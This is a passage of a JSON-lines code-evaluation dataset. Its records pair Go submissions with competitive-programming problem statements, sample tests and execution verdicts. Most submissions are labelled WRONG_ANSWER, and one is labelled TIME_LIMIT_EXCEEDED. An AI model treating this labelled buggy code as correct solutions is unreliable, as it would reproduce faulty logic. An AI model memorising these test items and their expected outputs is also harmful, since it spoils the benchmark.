 if a[i] <; a[j]:        log.append('0')        b[k] = a[i]        i += 1      else:        log.append('1')        b[k] = a[j]        j += 1      k += 1    while i <; m:      b[k] = a[i]      i += 1      k += 1    while j <; r:      b[k] = a[j]      j += 1      k += 1    for p in range(l, r):      a[p] = b[p]  mergeSort(0, n)  return \"\".join(log)\u041a\u0430\u043a \u043c\u043e\u0436\u043d\u043e \u0437\u0430\u043c\u0435\u0442\u0438\u0442\u044c, \u044d\u0442\u043e\u0442 \u043a\u043e\u0434 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442 \u043b\u043e\u0433\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435\u00a0\u2014 \u0432\u0430\u0436\u043d\u0435\u0439\u0448\u0438\u0439 \u0438\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u043a\u0438.\u0421\u0442\u0430\u0440\u0448\u0438\u0439 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u0412\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u0435 \u0412\u0430\u0441\u044f \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043b \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0443 $$$a$$$ (\u043c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 $$$n$$$ \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u044b\u0445 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b \u043e\u0442 $$$1$$$ \u0434\u043e $$$n$$$), \u0434\u0430\u043b \u0435\u0451 \u043d\u0430 \u0432\u0445\u043e\u0434 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 sort \u0438 \u043f\u043e\u043b\u0443\u0447\u0438\u043b \u043d\u0430 \u0432\u044b\u0445\u043e\u0434\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 $$$s$$$. \u041d\u0430 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0434\u0435\u043d\u044c \u0441\u0442\u0440\u043e\u043a\u0443 $$$s$$$ \u0412\u0430\u0441\u044f \u043d\u0430\u0448\u0451\u043b, \u0430 \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 $$$a$$$ \u043f\u043e\u0442\u0435\u0440\u044f\u043b\u0430\u0441\u044c. \u0412\u0430\u0441\u044f \u0445\u043e\u0447\u0435\u0442 \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u043b\u044e\u0431\u0443\u044e \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0443 $$$a$$$ \u0442\u0430\u043a\u0443\u044e, \u0447\u0442\u043e \u0432\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 sort \u043e\u0442 \u043d\u0435\u0451 \u0434\u0430\u0441\u0442 \u0442\u0443 \u0436\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 $$$s$$$. \u041f\u043e\u043c\u043e\u0433\u0438\u0442\u0435 \u0435\u043c\u0443!","input_from":"\u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0439 \u0432\u0432\u043e\u0434","output_to":"\u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0439 \u0432\u044b\u0432\u043e\u0434","input_spec":"\u0412\u0432\u043e\u0434 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043d\u0435\u043f\u0443\u0441\u0442\u0443\u044e \u0441\u0442\u0440\u043e\u043a\u0443 $$$s$$$, \u0441\u043e\u0441\u0442\u043e\u044f\u0449\u0443\u044e \u0438\u0437 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432 0 \u0438 1.  \u0412 \u044d\u0442\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u0437\u0430\u0434\u0430\u0447\u0438 \u0434\u043b\u044f \u043b\u044e\u0431\u043e\u0433\u043e \u0442\u0435\u0441\u0442\u0430 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0434\u043b\u0438\u043d\u044b $$$16$$$, \u0443\u0434\u043e\u0432\u043b\u0435\u0442\u0432\u043e\u0440\u044f\u044e\u0449\u0430\u044f \u0443\u0441\u043b\u043e\u0432\u0438\u044e. \u0422\u0435\u043c \u043d\u0435 \u043c\u0435\u043d\u0435\u0435, \u0432\u0430\u0448 \u043e\u0442\u0432\u0435\u0442 \u043c\u043e\u0436\u0435\u0442 \u0438\u043c\u0435\u0442\u044c \u043b\u044e\u0431\u0443\u044e \u0434\u043b\u0438\u043d\u0443, \u0432 \u0442\u043e\u043c \u0447\u0438\u0441\u043b\u0435 \u043e\u0442\u043b\u0438\u0447\u043d\u0443\u044e \u043e\u0442 $$$16$$$.","output_spec":"\u0412 \u043f\u0435\u0440\u0432\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0435 \u0432\u044b\u0432\u0435\u0434\u0438\u0442\u0435 \u0446\u0435\u043b\u043e\u0435 \u0447\u0438\u0441\u043b\u043e $$$n$$$\u00a0\u2014 \u0434\u043b\u0438\u043d\u0443 \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438. \u0412\u043e \u0432\u0442\u043e\u0440\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0435 \u0432\u044b\u0432\u0435\u0434\u0438\u0442\u0435 $$$n$$$ \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u044b\u0445 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b $$$a_0, a_1, \\ldots, a_{n-1}$$$ ($$$1 \\le a_i \\le n$$$)\u00a0\u2014 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043f\u0435\u0440\u0435\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438. \u0415\u0441\u043b\u0438 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432 \u043e\u0442\u0432\u0435\u0442\u0430, \u0432\u044b\u0432\u0435\u0434\u0438\u0442\u0435 \u043b\u044e\u0431\u043e\u0439 \u0438\u0437 \u043d\u0438\u0445.","notes":null,"sample_inputs":["00000000000000000000000000000000","11111111111111111111111111111111","101011010001100100011011001111011000011110010"],"sample_outputs":["16\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16","16\n16 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1","16\n13 6 1 7 12 5 4 15 14 16 10 11 3 8 9 2"]}
{"difficulty":800,"lang":"Go","lang_cluster":"go","src_uid":"b69170c8377623beb66db4706a02ffc6","submission_id":"57c8145751de2bf010e1a8735d8390f5","tags":["math"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"package main\n\nimport \"fmt\"\n\nfunc main()  {\n   var first ,second,input,n int\n   count:=0\n   fmt.Scan(&n)  \n\nfor j:=0;j<n ;{  \n\n\tfmt.Scan(&input) \n   for i := 1;; i++ {\n\t   first=input-i\n\t   second=i\n\t   if first>second {\n\t\t   count++\t\t\n\t   }else{\n\t\t  \n\t\t   fmt.Println(count)\n\t\t   count=0\n\t\t   break\n\t   }\n   }\n   j++\n}\n\n}","description":"There are two sisters Alice and Betty. You have $$$n$$$ candies. You want to distribute these $$$n$$$ candies between two sisters in such a way that:  Alice will get $$$a$$$ ($$$a &gt; 0$$$) candies;  Betty will get $$$b$$$ ($$$b &gt; 0$$$) candies;  each sister will get some integer number of candies;  Alice will get a greater amount of candies than Betty (i.e. $$$a &gt; b$$$);  all the candies will be given to one of two sisters (i.e. $$$a+b=n$$$). Your task is to calculate the number of ways to distribute exactly $$$n$$$ candies between sisters in a way described above. Candies are indistinguishable.Formally, find the number of ways to represent $$$n$$$ as the sum of $$$n=a+b$$$, where $$$a$$$ and $$$b$$$ are positive integers and $$$a&gt;b$$$.You have to answer $$$t$$$ independent test cases.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer $$$t$$$ ($$$1 \\le t \\le 10^4$$$) \u2014 the number of test cases. Then $$$t$$$ test cases follow. The only line of a test case contains one integer $$$n$$$ ($$$1 \\le n \\le 2 \\cdot 10^9$$$) \u2014 the number of candies you have.","output_spec":"For each test case, print the answer \u2014 the number of ways to distribute exactly $$$n$$$ candies between two sisters in a way described in the problem statement. If there is no way to satisfy all the conditions, print $$$0$$$.","notes":"NoteFor the test case of the example, the $$$3$$$ possible ways to distribute candies are:  $$$a=6$$$, $$$b=1$$$;  $$$a=5$$$, $$$b=2$$$;  $$$a=4$$$, $$$b=3$$$. ","sample_inputs":["6\n7\n1\n2\n3\n2000000000\n763243547"],"sample_outputs":["3\n0\n0\n1\n999999999\n381621773"]}
{"difficulty":1000,"lang":"Go","lang_cluster":"go","src_uid":"bd5912fe2c5c37658f28f6b159b39645","submission_id":"re_1503","tags":["implementation","greedy","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar word string\n\tvar k int\n\n\tfmt.Scan(&word,&k)\n\n\tif len(word) < k {\n\t\tfmt.Println(\"impossible\")\n\t\treturn\n\t}\n\n\tvar chs map[rune]int = make(map[rune]int,0)\n\n\tfor _,ch := range word {\n\t\tchs[ch]++\n\t}\n\n\tvar countRep = 0\n\tfor _,num := range chs {\n\t\tcountRep += num - 1\n\t}\n\n    fmt.Println(countRep)\n}","description":"Calculate the minimum number of characters you need to change in the string s, so that it contains at least k different letters, or print that it is impossible.String s consists only of lowercase Latin letters, and it is allowed to change characters only to lowercase Latin letters too.","input_from":"standard input","output_to":"standard output","input_spec":"First line of input contains string s, consisting only of lowercase Latin letters (1\u2009\u2264\u2009|s|\u2009\u2264\u20091000, |s| denotes the length of s). Second line of input contains integer k (1\u2009\u2264\u2009k\u2009\u2264\u200926).","output_spec":"Print single line with a minimum number of necessary changes, or the word \u00abimpossible\u00bb (without quotes) if it is impossible.","notes":"NoteIn the first test case string contains 6 different letters, so we don't need to change anything.In the second test case string contains 4 different letters: {'a',\u2009'h',\u2009'o',\u2009'y'}. To get 5 different letters it is necessary to change one occurrence of 'o' to some letter, which doesn't occur in the string, for example, {'b'}.In the third test case, it is impossible to make 7 different letters because the length of the string is 6.","sample_inputs":["yandex\n6","yahoo\n5","google\n7"],"sample_outputs":["0","1","impossible"]}
{"difficulty":1000,"lang":"Go","lang_cluster":"go","src_uid":"bdd86c8bc54bbac6e2bb5a9d68b6eb1c","submission_id":"re_1305","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"\ufeffpackage main\nimport (\n\t\"fmt\"\n\t\/\/\"sort\"\n)\nfunc main() {\n\tvar n,m int\n\tc:=0\n\tfmt.Scan(&n)\n\ta:=make([]int,n+1)\n\tfor i:=0;i<n;i++ {\n\t\tfmt.Scan(&m)\n\t\ta[m]++\n\t}\n\tfor i:=1;i<=n;i++ {\n\t\tif a[i]==0 {\n\t\t\tc++\n\t\t}\n\t}\n\tfmt.Println(c)\n}\n\n","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,\u2009a2,\u2009...,\u2009an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20095000,\u20091\u2009\u2264\u2009i\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.","notes":"NoteThe first sample contains the permutation, which is why no replacements are required.In the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.In the third sample we can replace the second element with number 4 and the fourth element with number 2.","sample_inputs":["3\n3 1 2","2\n2 2","5\n5 3 3 3 1"],"sample_outputs":["0","1","2"]}
{"difficulty":1200,"lang":"Go","lang_cluster":"go","src_uid":"c31fed523230af1f904218b2fe0d663d","submission_id":"re_947","tags":["implementation","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n  \"os\"\n  \"bufio\"\n  \"strconv\"\n  \"fmt\"\n  \"sort\"\n)\n\nvar scanner *bufio.Scanner\n\nfunc getI64() int64 {\n  scanner.Scan()\n  x, _ := strconv.ParseInt(scanner.Text(), 10, 64)\n  return x\n}\nfunc getI() int {\n  return int(getI64())\n}\nfunc getF() float64 {\n  scanner.Scan()\n  x, _ := strconv.ParseFloat(scanner.Text(), 64)\n  return x\n}\nfunc getS() string {\n  scanner.Scan()\n  return scanner.Text()\n}\n\ntype House struct {\n  Pos, Size int\n}\ntype Houses []*House\nfunc (houses Houses) Len() int {\n  return len(houses)\n}\nfunc (houses Houses) Swap(i, j int) {\n  houses[i], houses[j] = houses[j], houses[i]\n}\nfunc (houses Houses) Less(i, j int) bool {\n  return houses[i].Pos < houses[j].Pos\n}\n\nfunc main() {\n  scanner = bufio.NewScanner(os.Stdin)\n  scanner.Split(bufio.ScanWords)\n  writer := bufio.NewWriter(os.Stdout)\n  defer writer.Flush()\n\n  n, s := getI(), getI()\n  houses := make([]*House, n)\n  for i := 0; i < n; i++ {\n    houses[i] = &House{ getI(), getI() }\n  }\n  sort.Sort(Houses(houses))\n  result := 2\n  for i := 1; i < n; i++ {\n    doubleGap := 2*(houses[i].Pos - houses[i-1].Pos)\n    doubleGap -= houses[i].Size + houses[i-1].Size\n    if doubleGap >= 2*s {\n      result++\n    }\n  }\n  writer.WriteString(fmt.Sprintf(\"%d\\n\", result))\n}\n","description":"A new cottage village called \u00abFlatville\u00bb is being built in Flatland. By now they have already built in \u00abFlatville\u00bb n square houses with the centres on the \u041ex-axis. The houses' sides are parallel to the coordinate axes. It's known that no two houses overlap, but they can touch each other.The architect bureau, where Peter works, was commissioned to build a new house in \u00abFlatville\u00bb. The customer wants his future house to be on the \u041ex-axis, to be square in shape, have a side t, and touch at least one of the already built houses. For sure, its sides should be parallel to the coordinate axes, its centre should be on the Ox-axis and it shouldn't overlap any of the houses in the village.Peter was given a list of all the houses in \u00abFlatville\u00bb. Would you help him find the amount of possible positions of the new house?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains numbers n and t (1\u2009\u2264\u2009n,\u2009t\u2009\u2264\u20091000). Then there follow n lines, each of them contains two space-separated integer numbers: xi ai, where xi \u2014 x-coordinate of the centre of the i-th house, and ai \u2014 length of its side (\u2009-\u20091000\u2009\u2264\u2009xi\u2009\u2264\u20091000, 1\u2009\u2264\u2009ai\u2009\u2264\u20091000).","output_spec":"Output the amount of possible positions of the new house.","notes":"NoteIt is possible for the x-coordinate of the new house to have non-integer value.","sample_inputs":["2 2\n0 4\n6 2","2 2\n0 4\n5 2","2 3\n0 4\n5 2"],"sample_outputs":["4","3","2"]}
{"difficulty":1200,"lang":"Go","lang_cluster":"go","src_uid":"c3244e952830643938d51ce14f043d7d","submission_id":"re_1352","tags":["strings"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n  \"os\"\n  \"bufio\"\n  \"strings\"\n  \"strconv\"\n  \"fmt\"\n)\n\nvar scanner *bufio.Scanner\n\nfunc getI64() int64 {\n  scanner.Scan()\n  x, _ := strconv.ParseInt(scanner.Text(), 10, 64)\n  return x\n}\nfunc getI() int {\n  return int(getI64())\n}\nfunc getF() float64 {\n  scanner.Scan()\n  x, _ := strconv.ParseFloat(scanner.Text(), 64)\n  return x\n}\nfunc getS() string {\n  scanner.Scan()\n  return scanner.Text()\n}\n\nfunc seek(s, a, b string) bool {\n  aPos := strings.Index(s, a)\n  if aPos != -1 {\n    bPos := strings.Index(s[aPos+len(a):], b)\n    if bPos != -1 {\n      return true\n    }\n  }\n  return false\n}\n\nfunc main() {\n  scanner = bufio.NewScanner(os.Stdin)\n  scanner.Split(bufio.ScanWords)\n  writer := bufio.NewWriter(os.Stdout)\n  defer writer.Flush()\n\n  ab := getS()\n  n := len(ab)\n  baBytes := make([]byte, n)\n  for i := 0; i < n; i++ {\n    baBytes[i] = ab[n-1-i]\n  }\n  ba := string(baBytes)\n  s1, s2 := getS(), getS()\n  forward, backward := seek(ab, s1, s2), seek(ba, s1, s2)\n  result := \"fantasy\"\n  if forward && backward {\n    result = \"both\"\n  } else if forward {\n    result = \"forward\"\n  } else if backward {\n    result = \"backward\"\n  }\n  writer.WriteString(fmt.Sprintf(\"%s\\n\", result))\n}\n","description":"Peter likes to travel by train. He likes it so much that on the train he falls asleep. Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular colour.The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order.  The second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order. ","output_spec":"Output one of the four words without inverted commas:    \u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;  \u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;  \u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;  \u00abfantasy\u00bb \u2014 if Peter could not see such sequences. ","notes":"NoteIt is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B.","sample_inputs":["atob\na\nb","aaacaaa\naca\naa"],"sample_outputs":["forward","both"]}
{"difficulty":1200,"lang":"Go","lang_cluster":"go","src_uid":"cb4dbff31d967c3dab8fe0495eb871dc","submission_id":"re_1517","tags":["dsu","dfs and similar","brute force","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n  \"fmt\"\n  \"bufio\"\n  \"os\"\n  \"strconv\"\n)\n\n\/\/ Took from here: https:\/\/www.codementor.io\/tucnak\/using-golang-for-competitive-programming-h8lhvxzt3\nvar reader *bufio.Reader = bufio.NewReaderSize(os.Stdin, 10000000)\nvar writer *bufio.Writer = bufio.NewWriterSize(os.Stdout,10000000)\nfunc printf(f string, a ...interface{}) { fmt.Fprintf(writer, f, a...) }\nfunc scanf(f string, a ...interface{}) { fmt.Fscanf(reader, f, a...) }\n\nvar n, count int\nvar matrix [1001][1001]int\n\nfunc main() {\n  \/\/ STDOUT MUST BE FLUSHED MANUALLY!!!\n  defer writer.Flush()\n  \n  scanf(\"%d\\n\", &n)\n  for i := 1; i <= n; i++ {\n    var a, b int\n    scanf(\"%d %d\\n\", &a, &b)\n    matrix[a][b] = 1\n  }\n  \n  for i := 1; i <= 1000; i++ {\n    for j := 1; j <= 1000; j++ {\n      if matrix[i][j] == 1 {\n        count++\n        dfs_adaptada(i, j)\n        break\n      }\n    }\n  }\n  printf(strconv.Itoa(count - 1))\n}\n\nfunc dfs_adaptada(x, y int) () {\n  if matrix[x][y] == 1 {\n    matrix[x][y] = 2\n    for i := x + 1; i <= 1000; i++ {\n      if matrix[i][y] == 1 {\n        dfs_adaptada(i, y)\n      }\n    }\n    for j := y + 1; j <= 1000; j++ {\n      if matrix[x][j] == 1 {\n        dfs_adaptada(x, j)\n      }\n    }\n  }\n}\n","description":"Bajtek is learning to skate on ice. He's a beginner, so his only mode of transportation is pushing off from a snow drift to the north, east, south or west and sliding until he lands in another snow drift. He has noticed that in this way it's impossible to get from some snow drifts to some other by any sequence of moves. He now wants to heap up some additional snow drifts, so that he can get from any snow drift to any other one. He asked you to find the minimal number of snow drifts that need to be created.We assume that Bajtek can only heap up snow drifts at integer coordinates.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of snow drifts. Each of the following n lines contains two integers xi and yi (1\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u20091000) \u2014 the coordinates of the i-th snow drift. Note that the north direction coin\u0441ides with the direction of Oy axis, so the east direction coin\u0441ides with the direction of the Ox axis. All snow drift's locations are distinct.","output_spec":"Output the minimal number of snow drifts that need to be created in order for Bajtek to be able to reach any snow drift from any other one.","notes":null,"sample_inputs":["2\n2 1\n1 2","2\n2 1\n4 1"],"sample_outputs":["1","0"]}
{"difficulty":1100,"lang":"Go","lang_cluster":"go","src_uid":"d526af933b5afe9abfdf9815e9664144","submission_id":"re_1298","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ 192B\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc min(x, y int) int {\n\tif x < y {\n\t\treturn x\n\t}\n\treturn y\n}\nfunc max(x, y int) int {\n\tif x > y {\n\t\treturn x\n\t}\n\treturn y\n}\n\nfunc main() {\n\tvar n int\n\tfmt.Scan(&n)\n\tvar a [1005]int\n\tfor i := 0; i < n; i++ {\n\t\tfmt.Scan(a[i])\n\t}\n\tans := min(a[0], a[n-1])\n\tfor i := 0; i < n-1; i++ {\n\t\tans = min(ans, max(a[i], a[i+1]))\n\t}\n\tfmt.Println(ans)\n}\n","description":"In Berland the opposition is going to arrange mass walking on the boulevard. The boulevard consists of n tiles that are lain in a row and are numbered from 1 to n from right to left. The opposition should start walking on the tile number 1 and the finish on the tile number n. During the walk it is allowed to move from right to left between adjacent tiles in a row, and jump over a tile. More formally, if you are standing on the tile number i (i\u2009&lt;\u2009n\u2009-\u20091), you can reach the tiles number i\u2009+\u20091 or the tile number i\u2009+\u20092 from it (if you stand on the tile number n\u2009-\u20091, you can only reach tile number n). We can assume that all the opposition movements occur instantaneously.In order to thwart an opposition rally, the Berland bloody regime organized the rain. The tiles on the boulevard are of poor quality and they are rapidly destroyed in the rain. We know that the i-th tile is destroyed after ai days of rain (on day ai tile isn't destroyed yet, and on day ai\u2009+\u20091 it is already destroyed). Of course, no one is allowed to walk on the destroyed tiles! So the walk of the opposition is considered thwarted, if either the tile number 1 is broken, or the tile number n is broken, or it is impossible to reach the tile number n from the tile number 1 if we can walk on undestroyed tiles.The opposition wants to gather more supporters for their walk. Therefore, the more time they have to pack, the better. Help the opposition to calculate how much time they still have and tell us for how many days the walk from the tile number 1 to the tile number n will be possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009103) \u2014 the boulevard's length in tiles. The second line contains n space-separated integers ai \u2014 the number of days after which the i-th tile gets destroyed (1\u2009\u2264\u2009ai\u2009\u2264\u2009103). ","output_spec":"Print a single number \u2014 the sought number of days.","notes":"NoteIn the first sample the second tile gets destroyed after day three, and the only path left is 1\u2009\u2192\u20093\u2009\u2192\u20094. After day five there is a two-tile gap between the first and the last tile, you can't jump over it.In the second sample path 1\u2009\u2192\u20093\u2009\u2192\u20095 is available up to day five, inclusive. On day six the last tile is destroyed and the walk is thwarted.","sample_inputs":["4\n10 3 5 10","5\n10 2 8 3 5"],"sample_outputs":["5","5"]}
{"difficulty":1200,"lang":"Go","lang_cluster":"go","src_uid":"f8315dc903b0542c453cab4577bcb20d","submission_id":"re_896","tags":["implementation","dfs and similar","brute force","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/ 129B\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar x, y, b, d, e, f, h, i, j int\n\tb, y = 0, 0\n\tvar a [100][100]int\n\tvar m [100]int\n\tfmt.Scanf(\"%d %d\", &b, &d)\n\tfor x = 0; x < b; x++ {\n\t\tfor y = 0; y < b; y++ {\n\t\t\ta[x][y] = 0\n\t\t}\n\t\tm[x] = 0\n\t}\n\tfor x = 0; x < d; x++ {\n\t\tfmt.Scan(&e, &f)\n\t\ta[e-1][f-1] = 1\n\t\ta[f-1][e-1] = 1\n\t}\n\tj = 0\n\ti = 0\n\tfor x = 0; x < b; x++ {\n\t\ti = 0\n\t\tfor y = 0; y < b; y++ {\n\t\t\tif a[x][y] == 1 {\n\t\t\t\ti++\n\t\t\t}\n\t\t}\n\t\tm[x] = i\n\t}\n\tfor x = 0; x < b; x++ {\n\t\tif m[x] == 1 {\n\t\t\th++\n\t\t\tfor y = 0; y < b; y++ {\n\t\t\t\ta[x][y] = 0\n\t\t\t\ta[y][x] = 0\n\t\t\t}\n\t\t}\n\t}\n\tif h > 0 {\n\t\tj++\n\t\th = 0\n\t}\n\tfmt.Printf(\"%d\\n\", j)\n\treturn\n}\n","description":"Anna and Maria are in charge of the math club for junior students. When the club gathers together, the students behave badly. They've brought lots of shoe laces to the club and got tied with each other. Specifically, each string ties together two students. Besides, if two students are tied, then the lace connects the first student with the second one as well as the second student with the first one.To restore order, Anna and Maria do the following. First, for each student Anna finds out what other students he is tied to. If a student is tied to exactly one other student, Anna reprimands him. Then Maria gathers in a single group all the students who have been just reprimanded. She kicks them out from the club. This group of students immediately leaves the club. These students takes with them the laces that used to tie them. Then again for every student Anna finds out how many other students he is tied to and so on. And they do so until Anna can reprimand at least one student.Determine how many groups of students will be kicked out of the club.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m \u2014 the initial number of students and laces (). The students are numbered from 1 to n, and the laces are numbered from 1 to m. Next m lines each contain two integers a and b \u2014 the numbers of students tied by the i-th lace (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n,\u2009a\u2009\u2260\u2009b). It is guaranteed that no two students are tied with more than one lace. No lace ties a student to himself.","output_spec":"Print the single number \u2014 the number of groups of students that will be kicked out from the club.","notes":"NoteIn the first sample Anna and Maria won't kick out any group of students \u2014 in the initial position every student is tied to two other students and Anna won't be able to reprimand anyone.In the second sample four students are tied in a chain and two more are running by themselves. First Anna and Maria kick out the two students from both ends of the chain (1 and 4), then \u2014 two other students from the chain (2 and 3). At that the students who are running by themselves will stay in the club.In the third sample Anna and Maria will momentarily kick out all students except for the fourth one and the process stops at that point. The correct answer is one.","sample_inputs":["3 3\n1 2\n2 3\n3 1","6 3\n1 2\n2 3\n3 4","6 5\n1 4\n2 4\n3 4\n5 4\n6 4"],"sample_outputs":["0","2","1"]}
{"difficulty":800,"lang":"Go","lang_cluster":"go","src_uid":"facd9cd4fc1e53f50a1e6f947d78e942","submission_id":"re_759","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"sort\"\n)\ntype Rost struct {\n\tIndex int\n\tRost int\n}\nfunc main() {\n\tr := bufio.NewReader(os.Stdin)\n\tw := bufio.NewWriter(os.Stdout)\n\tdefer w.Flush()\n\n\tvar n int\n\tfmt.Fscan(r, &n)\n\ta := make([]Rost, n)\n\tfor i := 0; i < n; i++ {\n\t\tvar x int\n\t\tfmt.Fscan(r, &x)\n\t\ta[i] = Rost{i+1, x}\n\t}\n\tsort.Slice(a, func(i, j int) bool { return a[i].Rost < a[j].Rost})\n\tx := 0\n\ty := 1\n\th := a[y].Rost - a[x].Rost\n\tfor i := 2; i < n; i++ {\n\t\tif a[i].Rost - a[i-1].Rost < h {\n\t\t\th = a[i].Rost - a[i-1].Rost\n\t\t\tx = i-1\n\t\t\ty = i\n\t\t}\n\t}\n\tfmt.Fprintln(w, a[x].Index, a[y].Index)\n\t\n}\n","description":"n soldiers stand in a circle. For each soldier his height ai is known. A reconnaissance unit can be made of such two neighbouring soldiers, whose heights difference is minimal, i.e. |ai\u2009-\u2009aj| is minimal. So each of them will be less noticeable with the other. Output any pair of soldiers that can form a reconnaissance unit.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of soldiers. Then follow the heights of the soldiers in their order in the circle \u2014 n space-separated integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). The soldier heights are given in clockwise or counterclockwise direction.","output_spec":"Output two integers \u2014 indexes of neighbouring soldiers, who should form a reconnaissance unit. If there are many optimum solutions, output any of them. Remember, that the soldiers stand in a circle.","notes":null,"sample_inputs":["5\n10 12 13 15 10","4\n10 20 30 40"],"sample_outputs":["5 1","1 2"]}
